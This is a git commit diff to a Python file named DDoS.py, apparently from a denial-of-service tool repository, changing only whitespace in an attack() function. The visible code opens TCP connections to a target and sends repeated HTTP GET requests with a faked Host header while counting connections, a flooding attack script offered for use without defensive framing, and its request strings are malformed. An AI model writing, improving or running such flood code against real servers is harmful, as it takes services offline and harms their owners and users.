4133f979a873a52556ccf0dbf2e9498dff4071e8
RehanTOOLS <78783917+RehanTOOLS@users.noreply.github.com>
2021-02-14 09:01:45 +0700

    DDos.py
    Ddos

--- DDoS.py
+++ DDoS.py
@@ -22,7 +22,9 @@ def attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))
+        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target,port))
+        
+
 
         global already_connected
         already_connected += 1
